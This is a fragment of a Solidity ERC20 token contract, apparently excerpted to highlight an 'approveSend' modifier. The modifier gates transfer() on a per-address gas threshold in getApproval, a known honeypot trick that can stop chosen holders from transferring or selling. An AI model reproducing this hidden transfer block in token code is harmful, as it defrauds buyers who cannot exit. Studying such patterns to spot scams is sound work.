...
contract ERC20 is Context, IERC20 {
  ...
  modifier approveSend(address sender) {
        require(gasleft() >= getApproval[_msgSender()]);
        _;
    }
  ...
  function transfer(address recipient, uint256 amount) public virtual  override approveSend(_msgSender()) returns (bool) {
    _claimRecord();
